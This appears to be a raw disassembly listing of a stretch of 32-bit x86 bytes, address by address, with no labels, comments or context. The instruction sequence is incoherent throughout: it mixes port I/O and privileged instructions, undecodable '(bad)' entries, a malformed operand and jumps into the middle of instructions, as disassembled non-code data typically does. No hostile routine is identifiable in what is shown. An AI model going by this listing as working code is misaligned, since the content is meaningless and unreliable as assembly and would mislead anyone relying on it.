  420d60:	push   ebp
  420d61:	and    eax,0x642867f
  420d66:	add    al,0xd2
  420d68:	addr16 out dx,eax
  420d6a:	lods   al,BYTE PTR ds:[esi]
  420d6b:	popf   
  420d6c:	popa   
  420d6d:	mov    ebx,0x66c594e9
  420d72:	sbb    al,0xab
  420d74:	test   BYTE PTR [ebp-0x69],ch
  420d77:	push   es
  420d78:	sbb    ebp,DWORD PTR [eax+0x7ec814b6]
  420d7e:	sub    ecx,0x4f
  420d81:	hlt    
  420d82:	jl     0x420d95
  420d84:	jo     0x420de0
  420d86:	mov    edx,0xfff27749
  420d8b:	aaa    
  420d8c:	xchg   ebx,eax
  420d8d:	pop    ds
  420d8e:	aas    
  420d8f:	iret   
  420d90:	daa    
  420d91:	js     0x420d57
  420d93:	cwde   
  420d94:	xor    eax,0xf0a171b
  420d99:	das    
  420d9a:	loope  0x420da8
  420d9c:	mov    al,ds:0xcd371632
  420da1:	dec    esp
  420da2:	test   al,0x9d
  420da4:	scas   eax,DWORD PTR es:[edi]
  420da5:	mov    edi,0xc83688b8
  420daa:	rcr    BYTE PTR [ebp+edi*8-0x2d],cl
  420dae:	jge    0x420dcf
  420db0:	pop    es
  420db1:	sbb    ecx,esp
  420db3:	cmp    ebx,DWORD PTR [edx+0x46fa94ce]
  420db9:	jge    0x420e0a
  420dbb:	pop    eax
  420dbc:	shl    DWORD PTR [eax-0x5c],cl
  420dbf:	ror    BYTE PTR [ecx],cl
  420dc1:	pop    eax
  420dc2:	mov    BYTE PTR [ebx+ecx*1],al
  420dc5:	push   ss
  420dc6:	pop    eax
  420dc7:	scas   eax,DWORD PTR es:[edi]
  420dc8:	jno    0x420dc2
  420dca:	mov    bl,0xa9
  420dcc:	pop    eax
  420dcd:	xchg   DWORD PTR [ebx],ecx
  420dcf:	dec    ebp
  420dd0:	pop    es
  420dd1:	jbe    0x420dc1
  420dd3:	jne    0x420d74
  420dd5:	xor    BYTE PTR [edi-0x5a7ea213],al
  420ddb:	stc    
  420ddc:	push   ebp
  420ddd:	shl    esi,1
  420ddf:	shl    BYTE PTR [ebp+0x1db51662],1
  420de5:	fs ins BYTE PTR es:[edi],dx
  420de7:	mov    dl,0x9d
  420de9:	retf   
  420dea:	jp     0x420ddc
  420dec:	and    edx,DWORD PTR [ebx]
  420dee:	dec    eax
  420def:	add    esi,DWORD PTR [edx-0x2df88a88]
  420df5:	sub    eax,0x6e664183
  420dfa:	rcr    BYTE PTR [edi+0x5f88321d],0xc9
  420e01:	xor    BYTE PTR [ecx-0x1ff35d5d],bl
  420e07:	cdq    
  420e08:	xchg   ebx,eax
  420e09:	ret    0x85c4
  420e0c:	push   ebx
  420e0d:	push   ebp
  420e0e:	addr16 and eax,0x69e667e
  420e14:	mov    esi,0x5d35ddfb
  420e19:	js     0x420e69
  420e1b:	xchg   ecx,eax
  420e1c:	cmp    al,0x88
  420e1e:	mov    eax,0x5a384ef1
  420e23:	xor    eax,DWORD PTR [ecx+0xf]
  420e26:	int    0x7c
  420e28:	or     eax,0x31aa60a2
  420e2d:	call   0x9710:0x83e22faa
  420e34:	jns    0x420df2
  420e36:	loope  0x420e4e
  420e38:	jnp    0x420e81
  420e3a:	inc    ecx
  420e3b:	aad    0xf7
  420e3d:	test   DWORD PTR [eax],eax
  420e3f:	adc    eax,0x60d1df19
  420e44:	sbb    al,BYTE PTR [edi]
  420e46:	pop    eax
  420e47:	idiv   BYTE PTR [esi+0x0]
  420e4a:	xlat   BYTE PTR ds:[ebx]
  420e4b:	sub    al,0x8e
  420e4d:	out    0xa9,eax
  420e4f:	cmp    edx,ebx
  420e51:	fcomp  QWORD PTR [ebx+0x78ddf641]
  420e57:	dec    edx
  420e58:	sti    
  420e59:	in     al,dx
  420e5a:	inc    ebx
  420e5b:	add    al,0xa8
  420e5d:	stos   BYTE PTR es:[edi],al
  420e5e:	dec    edx
  420e5f:	mov    ecx,0x7a45a260
  420e64:	je     0x420ee3
  420e66:	test   DWORD PTR ds:0x55a49466,0xba35f48c
  420e70:	dec    eax
  420e71:	cmp    BYTE PTR [edx-0x857fb41],bh
  420e77:	jb     0x420e38
  420e79:	pushf  
  420e7a:	or     edx,DWORD PTR [eax+0x26]
  420e7d:	sbb    al,0xda
  420e7f:	outs   dx,BYTE PTR ds:[esi]
  420e80:	xor    edi,ebp
  420e82:	fimul  WORD PTR [ebp-0x65]
  420e85:	xchg   ecx,eax
  420e86:	pop    esi
  420e87:	rcr    DWORD PTR [eax],0x29
  420e8a:	shr    BYTE PTR [eax-0x46],cl
  420e8d:	lods   al,BYTE PTR ds:[esi]
  420e8e:	inc    BYTE PTR [ebx]
  420e90:	ret    0x1030
  420e93:	sub    BYTE PTR [ebx],ch
  420e95:	cli    
  420e96:	ss cmp eax,esp
  420e99:	idiv   BYTE PTR [eax+0x53]
  420e9c:	fiadd  WORD PTR [esi]
  420e9e:	test   dl,al
  420ea0:	int3   
  420ea1:	inc    edi
  420ea2:	sub    DWORD PTR [ecx+eiz*4-0x4d],ebp
  420ea6:	push   ds
  420ea7:	je     0x420f25
  420ea9:	call   0x3d0fc809
  420eae:	jae    0x420f1b
  420eb0:	mov    eax,ds:0x247fc6a5
  420eb5:	gs out 0xf4,eax
  420eb8:	fistp  DWORD PTR [ebp+0x679d148c]
  420ebe:	rcr    BYTE PTR [edx+eiz*4],0xb3
  420ec2:	neg    edi
  420ec4:	or     eax,0xc870435b
  420ec9:	cli    
  420eca:	ret    
  420ecb:	data16 clc 
  420ecd:	pop    ebp
  420ece:	loop   0x420ec1
  420ed0:	add    al,BYTE PTR [eax]
  420ed2:	pusha  
  420ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed4:	ror    BYTE PTR [eax+ecx*8],cl
  420ed7:	push   0xa7fd334a
  420edc:	jb     0x420eca
  420ede:	test   DWORD PTR [edi+edi*1+0x580a7cc9],ebp
  420ee5:	adc    DWORD PTR [eax+0x34],edx
  420ee8:	cld    
  420ee9:	sbb    BYTE PTR [ecx+0x45138d01],dl
  420eef:	sbb    BYTE PTR [edx],0x48
  420ef2:	and    edx,DWORD PTR [ebx-0x68]
  420ef5:	push   es
  420ef6:	stos   BYTE PTR es:[edi],al
  420ef7:	or     bl,BYTE PTR [eax-0x118c417b]
  420efd:	mov    DWORD PTR [eax+0x5e86c64b],edx
  420f03:	fdivr  DWORD PTR [ecx+0x68]
  420f06:	sub    al,0x51
  420f08:	sub    edx,0x3f
  420f0b:	ins    DWORD PTR es:[edi],dx
  420f0c:	adc    al,0x5b
  420f0e:	call   0x50bf69b5
  420f13:	sahf   
  420f14:	mov    ah,0x99
  420f16:	and    eax,0x2d66c659
  420f1b:	inc    edx
  420f1c:	aad    0xe8
  420f1e:	mov    dl,0x47
  420f20:	xchg   ebx,eax
  420f21:	add    DWORD PTR [edi],ebp
  420f23:	fidivr WORD PTR [ecx]
  420f25:	mov    eax,0xa50217b6
  420f2a:	push   cs
  420f2b:	int    0xc9
  420f2d:	or     BYTE PTR [edx-0x1b2c911c],0xd5
  420f34:	sub    DWORD PTR [eax+0x72735894],edi
  420f3a:	adc    DWORD PTR [edx+eiz*1+0x9],esp
  420f3e:	sbb    DWORD PTR [ebx-0x43],0xcd080ca0
  420f45:	add    DWORD PTR [ebx-0x5c07ed20],esi
  420f4b:	mov    bh,0xad
  420f4d:	push   esp
  420f4e:	and    DWORD PTR [ebp+0x7d],0xffffffa3
  420f52:	das    
  420f53:	xchg   ecx,eax
  420f54:	iret   
  420f55:	pop    eax
  420f56:	inc    eax
  420f57:	adc    eax,0x69e7bfc
  420f5c:	push   edx
  420f5d:	shl    BYTE PTR [esi],cl
  420f5f:	test   DWORD PTR cs:[ebx-0x18],ebx
  420f63:	jmp    0x420fbb
  420f65:	cmc    
  420f66:	mov    edx,0xb8e72ff
  420f6b:	xor    al,0x18
  420f6d:	mov    edi,DWORD PTR [edi+0x4f]
  420f70:	in     al,0xe9
  420f72:	out    0x9b,eax
  420f74:	fwait
  420f75:	imul   ebx,DWORD PTR [ebp-0x10],0x79
  420f79:	add    cl,BYTE PTR [ebx+ebx*4+0x79]
  420f7d:	cld    
  420f7e:	test   DWORD PTR [edx-0x38],ecx
  420f81:	cmc    
  420f82:	mov    al,ds:0xb7945def
  420f87:	mov    ebx,0x1f72cc53
  420f8c:	arpl   sp,dx
  420f8e:	inc    edi
  420f8f:	dec    esp
  420f90:	mov    al,ds:0x3d6ad6e4
  420f95:	shl    BYTE PTR [edi+0x49],0xab
  420f99:	sbb    al,0x35
  420f9b:	push   es
  420f9c:	aas    
  420f9d:	(bad)  
  420f9e:	retf   0x5e5e
  420fa1:	lods   al,BYTE PTR ds:[esi]
  420fa2:	das    
  420fa3:	jnp    0x421020
  420fa5:	mov    dh,0x78
  420fa7:	ficom  DWORD PTR [edi+0x57]
  420faa:	out    0xe,eax
  420fac:	mov    esi,0xc3d0cb3d
  420fb1:	dec    edi
  420fb2:	inc    ebx
  420fb3:	add    eax,0xf818d078
  420fb8:	inc    edi
  420fb9:	sbb    edx,0xffffffc8
  420fbc:	retf   
  420fbd:	stos   BYTE PTR es:[edi],al
  420fbe:	fwait
  420fbf:	es dec edx
  420fc1:	sub    DWORD PTR [edi+0x3b],ebp
  420fc4:	jg     0x420f6e
  420fc6:	sbb    DWORD PTR [ecx-0x6b4b4d1e],ecx
  420fcc:	int3   
  420fcd:	push   0xde792c7e
  420fd2:	mov    ds:0xb08fe99,eax
  420fd7:	xor    BYTE PTR [ecx-0x2e],0xf0
  420fdb:	sbb    eax,DWORD PTR [edi*4-0x6aff46ba]
  420fe2:	mov    BYTE PTR [edi+0x15],bl
  420fe5:	cmp    ebx,DWORD PTR [esi+0x4fc76bbb]
  420feb:	mov    eax,0xf483e4da
  420ff0:	and    bl,BYTE PTR [esi]
  420ff2:	dec    esp
  420ff3:	mov    cl,al
  420ff5:	push   eax
  420ff6:	pop    es
  420ff7:	scas   al,BYTE PTR es:[edi]
  420ff8:	ins    DWORD PTR es:[edi],dx
  420ff9:	xchg   ebx,eax
  420ffa:	jbe    0x421021
  420ffc:	xchg   ecx,eax
  420ffd:	cmp    al,BYTE PTR [esi+edi*1+0x4]
  421001:	cmp    DWORD PTR [ebx-0x952cb27],ecx
  421007:	mov    edx,0xb2f58c8a
  42100c:	out    0xa8,eax
  42100e:	sub    edx,DWORD PTR [edi-0x6b]
  421011:	inc    ebp
  421012:	rcl    edx,1
  421014:	pop    ss
  421015:	jl     0x420fc7
  421017:	and    ecx,DWORD PTR [ebp-0x30]
  42101a:	call   0x22df60f5
  42101f:	loopne 0x42100c
  421021:	pop    esp
  421022:	fidiv  WORD PTR [ecx-0x34d3c12d]
  421028:	pop    es
  421029:	jae    0x420faf
  42102b:	cmp    al,0x83
  42102d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42102e:	xchg   ecx,eax
  42102f:	mov    ecx,0x91e1fb7b
  421034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421035:	mov    DWORD PTR ds:0xe0c73183,edi
  42103b:	inc    ebx
  42103c:	push   ss
  42103d:	sbb    edi,DWORD PTR [eax]
  42103f:	pusha  
  421040:	icebp  
  421041:	call   0xd50a3427
  421046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421047:	ins    DWORD PTR es:[edi],dx
  421048:	adc    bl,bh
  42104a:	cli    
  42104b:	loop   0x42107a
  42104d:	or     bh,0x67
  421050:	daa    
  421051:	mov    bl,0xd8
  421053:	add    al,0x2b
  421055:	mov    al,ds:0x3a1918a2
  42105a:	out    0x7f,eax
  42105c:	das    
  42105d:	icebp  
  42105e:	dec    esi
  42105f:	jecxz  0x4210b5
  421061:	pop    edi
  421062:	cmp    BYTE PTR [ecx-0x4d],0x3e
  421066:	addr16 cli 
  421068:	push   es
  421069:	mov    esi,0x5373ddac
  42106e:	xor    al,0x4d
  421070:	jno    0x421093
  421072:	or     ebx,DWORD PTR [edx]
  421074:	add    esi,ecx
  421076:	xor    edx,ebp
  421078:	shr    al,1
  42107a:	and    eax,DWORD PTR [eax]
  42107c:	push   esi
  42107d:	adc    al,0x4c
  42107f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421080:	aad    0x84
  421082:	and    al,0x4b
  421084:	inc    ebx
  421085:	fcomp  DWORD PTR [ebx-0x2d7031ea]
  42108b:	mov    eax,ds:0xa3213a15
  421090:	jp     0x4210cb
  421092:	jg     0x421035
  421094:	xor    eax,0x496a7be7
  421099:	add    al,0x55
  42109b:	out    0x75,eax
  42109d:	adc    al,0xeb
  42109f:	push   esi
  4210a0:	xchg   edi,eax
  4210a1:	push   ecx
  4210a2:	lods   al,BYTE PTR ds:[esi]
  4210a3:	or     ebp,DWORD PTR [edi+0x1b844abd]
  4210a9:	fcomp  st(3)
  4210ab:	adc    BYTE PTR [ebp+0x6a],ch
  4210ae:	prefetch BYTE PTR [edx+0x1a]
  4210b2:	test   DWORD PTR ds:0xf56a1304,edx
  4210b8:	bound  eax,QWORD PTR [eax]
  4210ba:	inc    edi
  4210bb:	add    ch,BYTE PTR [ebx]
  4210bd:	sahf   
  4210be:	mov    ah,BYTE PTR [ebx+0x6c]
  4210c1:	(bad)  
  4210c2:	jmp    0x4210ce
  4210c4:	jecxz  0x421063
  4210c6:	jmp    0x4210b6
  4210c8:	jb     0x421110
  4210ca:	std    
  4210cb:	out    dx,eax
  4210cc:	jne    0x4210e2
  4210ce:	mov    esp,0x7049e066
  4210d3:	mov    esp,0x482cab25
  4210d8:	test   BYTE PTR [edi-0x46],bl
  4210db:	jbe    0x42110d
  4210dd:	loop   0x4210d0
  4210df:	jp     0x42113b
  4210e1:	pop    ebx
  4210e2:	pop    edi
  4210e3:	pop    ss
  4210e4:	push   ds
  4210e5:	cmp    ecx,eax
  4210e7:	call   0xc49e:0xf2faa0e9
  4210ee:	stc    
  4210ef:	int    0xe0
  4210f1:	ret    0x3682
  4210f4:	lahf   
  4210f5:	sbb    DWORD PTR [edx-0x9],edx
  4210f8:	mov    ds:0xd9d3382,al
  4210fd:	loopne 0x421115
  4210ff:	xchg   edx,esp
  421101:	ins    BYTE PTR es:[edi],dx
  421102:	xor    eax,0x284b0f36
  421107:	add    DWORD PTR [edx+0x53],eax
  42110a:	mov    ecx,0x181455f7
  42110f:	ds jne 0x421146
  421112:	add    al,0xd2
  421114:	outs   dx,BYTE PTR ds:[esi]
  421115:	xor    ebp,DWORD PTR [edi*1-0x444a58da]
  42111c:	std    
  42111d:	jns    0x4210fc
  42111f:	and    BYTE PTR [ebx+0x6f44f1ea],al
  421125:	xchg   edx,eax
  421126:	stos   BYTE PTR es:[edi],al
  421127:	cmp    edx,DWORD PTR [edx+0x1a]
  42112a:	xchg   esp,eax
  42112b:	cmp    al,0x35
  42112d:	in     al,0x21
  42112f:	xor    eax,0x873fbd6
  421134:	ins    DWORD PTR es:[edi],dx
  421135:	dec    ebx
  421136:	dec    ebx
  421137:	stos   BYTE PTR es:[edi],al
  421138:	and    ebp,DWORD PTR [ecx]
  42113a:	sbb    eax,0x21c72d34
  42113f:	xchg   ebx,eax
  421140:	(bad)  
  421141:	in     al,dx
  421142:	in     al,0x95
  421144:	(bad)  
  421145:	xchg   esi,eax
  421146:	std    
  421147:	aam    0x20
  421149:	fisub  DWORD PTR [ebx]
  42114b:	in     al,dx
  42114c:	pop    edx
  42114d:	add    BYTE PTR [eax],ch
  42114f:	fwait
  421150:	inc    edx
  421151:	shl    edi,cl
  421153:	dec    edx
  421154:	lahf   
  421155:	lahf   
  421156:	inc    ebp
  421157:	sti    
  421158:	mov    ds:0x729e001a,al
  42115d:	ficom  WORD PTR [esi]
  42115f:	adc    DWORD PTR [esi-0x4d33c61a],esi
  421165:	daa    
  421166:	pusha  
  421167:	cs into 
  421169:	outs   dx,DWORD PTR ds:[esi]
  42116a:	test   al,0xa8
  42116c:	mov    al,0x1e
  42116e:	or     eax,0xe31ac1d0
  421173:	mov    ch,0x71
  421175:	fld    TBYTE PTR [ecx+edx*4]
  421178:	cmp    edx,DWORD PTR [ecx-0x2053204a]
  42117e:	inc    ecx
  42117f:	pop    edi
  421180:	test   BYTE PTR [ecx-0x4],ch
  421183:	cmp    ecx,ecx
  421185:	rcr    esp,cl
  421187:	imul   DWORD PTR [edi+0x4b]
  42118a:	mov    ebp,0x607e2e6
  42118f:	inc    esp
  421190:	(bad)  
  421192:	(bad)  
  421193:	fdivr  QWORD PTR [eax-0x5d318b5b]
  421199:	inc    edx
  42119a:	push   0x2a21ba86
  42119f:	inc    edx
  4211a0:	push   esi
  4211a1:	repz sbb edi,DWORD PTR [ebp-0x7ff1b03d]
  4211a8:	lods   al,BYTE PTR ds:[esi]
  4211a9:	sub    eax,0x246009a9
  4211ae:	sub    BYTE PTR [ecx-0x22],ch
  4211b1:	cmp    ax,0x640f
  4211b5:	cmc    
  4211b6:	jo     0x4211c1
  4211b8:	jle    0x421239
  4211ba:	fwait
  4211bb:	pop    edx
  4211bc:	mov    al,ds:0xc188adbc
  4211c1:	rol    DWORD PTR [ebx+0x31],cl
  4211c4:	ffreep st(6)
  4211c6:	jmp    0x4b755f47
  4211cb:	add    esp,DWORD PTR [esp+esi*1+0x298d27f2]
  4211d2:	sub    esi,esi
  4211d4:	xor    DWORD PTR [edx+0x2d],esp
  4211d7:	and    ebx,DWORD PTR [ebp+0xaf1de40]
  4211dd:	xor    ah,BYTE PTR [ecx-0x3b4c5278]
  4211e3:	sub    BYTE PTR [esi+esi*2-0x4f486c88],bh
  4211ea:	pop    ds
  4211eb:	(bad)  
  4211ec:	mov    esp,0xdeeb5f0e
  4211f1:	push   edx
  4211f2:	mov    eax,ds:0x9799ce99
  4211f7:	lds    ecx,FWORD PTR [edi-0x7c]
  4211fa:	in     al,dx
  4211fb:	pop    ss
  4211fc:	sbb    dl,bl
  4211fe:	pop    eax
  4211ff:	push   0x23
  421201:	hlt    
  421202:	dec    edi
  421203:	(bad)  
  421204:	(bad)  
  421205:	push   0x5ce219be
  42120a:	cmp    BYTE PTR ds:[edi-0xdd23796],cl
  421211:	in     eax,dx
  421212:	mov    esp,ebp
  421214:	adc    dh,ah
  421216:	rcr    DWORD PTR [ebp-0x16],0x66
  42121a:	or     ah,BYTE PTR [ebp-0x44]
  42121d:	mov    dl,dh
  42121f:	xor    eax,0x2a308f51
  421224:	mov    DWORD PTR [ecx-0x5d25847d],ecx
  42122a:	mov    ds:0x33c5bf3,eax
  42122f:	sbb    ebx,DWORD PTR [eax+0x41]
  421232:	or     BYTE PTR [esp+esi*4],dh
  421235:	sbb    eax,0xc7b6bb2
  42123a:	adc    DWORD PTR [edx],ebp
  42123c:	dec    BYTE PTR [edi+0x70acf27a]
  421242:	and    ebp,DWORD PTR [edx]
  421244:	cmp    al,0x69
  421246:	or     BYTE PTR [eax-0x964dbb8],bh
  42124c:	jge    0x421207
  42124e:	(bad)  
  42124f:	(bad)  
  421251:	fmul   st,st(7)
  421253:	mov    eax,ds:0x108d41c9
  421258:	adc    esp,DWORD PTR [ebp-0x44]
  42125b:	mov    WORD PTR [edx],ss
  42125d:	icebp  
  42125e:	or     BYTE PTR [ebx+ecx*4],ch
  421261:	pop    edx
  421262:	mov    cs,eax
  421264:	xchg   BYTE PTR [ebx-0x2122d525],al
  42126a:	add    al,BYTE PTR [edi+ecx*8+0x4cf55161]
  421271:	addr16 sub eax,0xc466357b
  421277:	aaa    
  421278:	loope  0x421269
  42127a:	sub    BYTE PTR [esi+0x1f],ah
  42127d:	sbb    BYTE PTR [edi+0x63],dh
  421280:	arpl   WORD PTR [ebx-0x5],dx
  421283:	icebp  
  421284:	sub    BYTE PTR [esi+ecx*4-0x37187439],0xc9
  42128c:	ret    
  42128d:	mov    eax,0xcc2f03c5
  421292:	stos   DWORD PTR es:[edi],eax
  421293:	outs   dx,BYTE PTR ds:[esi]
  421294:	ret    0x7afe
  421297:	cmc    
  421298:	sti    
  421299:	mov    ds:0xd56c6900,al
  42129e:	and    bl,ch
  4212a0:	fcomi  st,st(5)
  4212a2:	pop    es
  4212a3:	leave  
  4212a4:	mov    ah,0xf7
  4212a6:	mov    edx,0x4afe79df
  4212ab:	dec    ebx
  4212ac:	and    cl,BYTE PTR [edx-0x1f7ede4]
  4212b2:	dec    esp
  4212b3:	cmp    BYTE PTR [edx-0x25d73837],0x7a
  4212ba:	and    al,BYTE PTR [ebx]
  4212bc:	(bad)  
  4212be:	fdiv   QWORD PTR [ebp-0x7b611507]
  4212c4:	cmp    BYTE PTR [edi+0x1e],0x8e
  4212c8:	adc    dl,bl
  4212ca:	int3   
  4212cb:	mov    esi,esp
  4212cd:	mov    ecx,0x476d3cc0
  4212d2:	ja     0x421297
  4212d4:	push   ebp
  4212d5:	stos   DWORD PTR es:[edi],eax
  4212d6:	fimul  WORD PTR [edx]
  4212d8:	es xchg edi,eax
  4212da:	dec    eax
  4212db:	mov    ebx,?
  4212dd:	xor    DWORD PTR [edx-0x54dca68f],ebp
  4212e3:	xchg   ebp,eax
  4212e4:	mov    dl,BYTE PTR [esi]
  4212e6:	ror    esp,1
  4212e8:	push   0x33
  4212ea:	mov    ds:0x2b313a55,eax
  4212ef:	sahf   
  4212f0:	ret    
  4212f1:	mov    bl,0x68
  4212f3:	fnsave [ebp+0x2b]
  4212f6:	or     esp,edx
  4212f8:	add    eax,0x60be3d47
  4212fd:	sub    BYTE PTR [edi+edx*2+0x795533a0],bh
  421304:	pop    edx
  421305:	inc    esp
  421306:	adc    eax,0x9dc8499a
  42130b:	or     edx,eax
  42130d:	sahf   
  42130e:	dec    esp
  42130f:	pop    ebx
  421310:	nop
  421311:	add    cl,BYTE PTR [edx]
  421313:	push   0x4d3b7132
  421318:	call   0xe72d5488
  42131d:	add    eax,0x50faa5b7
  421322:	in     eax,dx
  421323:	xchg   esi,eax
  421324:	fimul  DWORD PTR [esi]
  421326:	scas   eax,DWORD PTR es:[edi]
  421327:	mov    WORD PTR [edx+0xdc3754f],cs
  42132d:	int    0x3e
  42132f:	repz sbb ebx,DWORD PTR [ecx]
  421332:	outs   dx,BYTE PTR ds:[esi]
  421333:	stc    
  421334:	mov    edi,0xe5622d33
  421339:	arpl   WORD PTR [edi+ebp*4-0x5dfd26d5],si
  421340:	add    edi,ebp
  421342:	sub    DWORD PTR [ebx-0x78c667ad],esp
  421348:	inc    esp
  421349:	add    bl,0xb7
  42134c:	jl     0x42139a
  42134e:	push   es
  42134f:	add    ebx,0xffffffa1
  421352:	cmp    BYTE PTR [edi-0x34e3a313],dl
  421358:	add    edx,eax
  42135a:	cwde   
  42135b:	jbe    0x4213a7
  42135d:	sbb    eax,0x734238a
  421362:	out    dx,eax
  421363:	mov    edi,0x30eece00
  421368:	and    al,0x3a
  42136a:	lds    esp,FWORD PTR [ecx-0x2d]
  42136d:	mov    ds:0x86210f5b,al
  421372:	dec    edi
  421373:	dec    esi
  421374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421375:	(bad)  
  421377:	arpl   WORD PTR [edi+edx*2],dx
  42137a:	inc    edx
  42137b:	jle    0x42136a
  42137d:	cdq    
  42137e:	std    
  42137f:	adc    al,dh
  421381:	and    cl,BYTE PTR [edx-0x2817c130]
  421387:	nop
  421388:	jno    0x421362
  42138a:	xchg   ecx,eax
  42138b:	scas   eax,DWORD PTR es:[edi]
  42138c:	stc    
  42138d:	push   es
  42138e:	dec    eax
  42138f:	mov    DWORD PTR [ebp-0x3b0f9c53],edx
  421395:	les    ebp,FWORD PTR [ecx+0x2458680e]
  42139b:	cli    
  42139c:	(bad)  
  42139d:	stos   BYTE PTR es:[edi],al
  42139e:	push   cs
  42139f:	adc    esp,DWORD PTR [esp+edi*2]
  4213a2:	or     BYTE PTR [esi-0x7c],0x9a
  4213a6:	mov    ebx,0xf0bf80e
  4213ab:	add    DWORD PTR [ecx+0x29],0xfffffffe
  4213af:	ins    DWORD PTR es:[edi],dx
  4213b0:	jo     0x42136b
  4213b2:	inc    ebp
  4213b3:	stos   DWORD PTR es:[edi],eax
  4213b4:	adc    DWORD PTR [eax+0x38],esi
  4213b7:	mov    esp,edx
  4213b9:	xor    al,0xec
  4213bb:	push   0x29
  4213bd:	outs   dx,BYTE PTR ds:[esi]
  4213be:	popf   
  4213bf:	xchg   esp,eax
  4213c0:	inc    eax
  4213c1:	out    0x18,al
  4213c3:	mov    bh,0xc0
  4213c5:	rcr    DWORD PTR [eax+ecx*8-0x70],0xe4
  4213ca:	aas    
  4213cb:	add    eax,0xdadc3075
  4213d0:	fsubr  DWORD PTR [eax]
  4213d2:	out    0x29,eax
  4213d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213d5:	or     BYTE PTR [esi-0x56],cl
  4213d8:	sub    DWORD PTR [eax],edx
  4213da:	adc    edx,DWORD PTR ds:0x233088ac
  4213e0:	add    ch,ah
  4213e2:	mov    al,ds:0x43db382a
  4213e7:	mov    DWORD PTR [ebp+0x377dd5],edi
  4213ed:	call   0x7a0e:0x9e444942
  4213f4:	(bad)  
  4213f5:	rcl    esi,1
  4213f7:	ret    
  4213f8:	pop    esp
  4213f9:	push   edi
  4213fa:	adc    DWORD PTR [esi+0x40692c3d],0xfffffff8
  421401:	pusha  
  421402:	or     eax,0x2a85eefb
  421407:	pusha  
  421408:	push   ebp
  421409:	test   ch,bl
  42140b:	mov    al,0x6c
  42140d:	popf   
  42140e:	aad    0x64
  421410:	xor    BYTE PTR [ebp+0x47],ah
  421413:	mov    bl,0x5c
  421415:	aas    
  421416:	cmp    esp,esp
  421418:	add    al,0xd1
  42141a:	out    0xae,eax
  42141c:	pop    ds
  42141d:	cmp    BYTE PTR [edx+0x5a],bh
  421420:	sbb    al,0xe0
  421422:	or     al,0x33
  421424:	push   ecx
  421425:	xor    esi,DWORD PTR [edx-0x9]
  421428:	sbb    al,0xd6
  42142a:	push   ss
  42142b:	add    DWORD PTR [edi-0x10],esi
  42142e:	sub    edx,esi
  421430:	cmp    al,0x2f
  421432:	add    al,0xbb
  421434:	jbe    0x4214a3
  421436:	xchg   esp,eax
  421437:	pop    ebx
  421438:	or     BYTE PTR [esi+0x74],bl
  42143b:	and    DWORD PTR [edi],ebp
  42143d:	stos   DWORD PTR es:[edi],eax
  42143e:	in     al,0x8b
  421440:	outs   dx,BYTE PTR ds:[esi]
  421441:	add    bl,BYTE PTR [esi+0x0]
  421444:	xor    eax,0xa2b42422
  421449:	cmp    DWORD PTR [edi*8+0x273e9600],esp
  421450:	pushf  
  421451:	rcr    cl,1
  421453:	lahf   
  421454:	dec    ebp
  421455:	lock fstp TBYTE PTR [edx]
  421458:	xchg   DWORD PTR [edi],esp
  42145a:	push   edi
  42145b:	and    eax,0x76eaa376
  421460:	xor    ah,ch
  421462:	or     BYTE PTR [esi],bh
  421464:	xor    ch,BYTE PTR [ebx]
  421466:	dec    edx
  421467:	xchg   ebx,esi
  421469:	inc    eax
  42146a:	xchg   esp,eax
  42146b:	sub    BYTE PTR [ecx+edx*4],dh
  42146e:	dec    BYTE PTR [ebp-0x6b0e16e6]
  421474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421475:	pusha  
  421476:	repnz mov eax,0x7b016680
  42147c:	jge    0x4213ff
  42147e:	test   dh,ch
  421480:	gs fs push esi
  421483:	inc    edi
  421484:	and    eax,DWORD PTR [esp+eax*1+0x60]
  421488:	or     BYTE PTR [edi-0x71],ch
  42148b:	rol    cl,cl
  42148d:	push   ss
  42148e:	sub    ch,ch
  421490:	sub    BYTE PTR [ebx-0x3082e0aa],al
  421496:	add    al,0xdf
  421498:	cdq    
  421499:	ins    DWORD PTR es:[edi],dx
  42149a:	frstor [esi]
  42149c:	and    BYTE PTR [esi-0x6e],cl
  42149f:	pop    ds
  4214a0:	(bad)  
  4214a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214a2:	daa    
  4214a3:	pop    ss
  4214a4:	xlat   BYTE PTR ds:[ebx]
  4214a5:	mov    esp,0x27b6ec0a
  4214aa:	sub    eax,DWORD PTR [ebp-0x62e9fe63]
  4214b0:	aam    0x8a
  4214b2:	push   ebx
  4214b3:	cs xchg ebp,eax
  4214b5:	scas   al,BYTE PTR es:[edi]
  4214b6:	lds    ebx,FWORD PTR [ecx]
  4214b8:	sub    eax,0x1dba3d28
  4214bd:	mov    al,0xd
  4214bf:	or     DWORD PTR [eax+0x19b953f6],edi
  4214c5:	xchg   ecx,eax
  4214c6:	push   es
  4214c7:	or     dh,ch
  4214c9:	imul   BYTE PTR [edx+0x5a]
  4214cc:	pop    edx
  4214cd:	xchg   ecx,eax
  4214ce:	lods   al,BYTE PTR ds:[esi]
  4214cf:	lea    edi,[edi]
  4214d1:	rcl    BYTE PTR [edi+0x3],1
  4214d4:	cmp    edi,eax
  4214d6:	jb     0x421523
  4214d8:	pop    ss
  4214d9:	push   es
  4214da:	cmp    ah,BYTE PTR [ebx]
  4214dc:	jns    0x4214ee
  4214de:	std    
  4214df:	enter  0x15dd,0xeb
  4214e3:	sbb    al,ah
  4214e5:	jo     0x421480
  4214e7:	push   ebx
  4214e8:	adc    edx,DWORD PTR [eax+0x6ea54564]
  4214ee:	into   
  4214ef:	xchg   ebx,eax
  4214f0:	jne    0x421526
  4214f2:	mov    edx,0x5adcb09
  4214f7:	dec    ebx
  4214f8:	dec    ebp
  4214f9:	add    eax,0x1744279e
  4214fe:	(bad)  
  4214ff:	mov    ch,0xef
  421501:	mov    bl,ch
  421503:	mov    dl,0xe2
  421505:	inc    edi
  421506:	xor    dl,cl
  421508:	in     al,0xb0
  42150a:	outs   dx,BYTE PTR ds:[esi]
  42150b:	jl     0x4214db
  42150d:	dec    ecx
  42150e:	nop
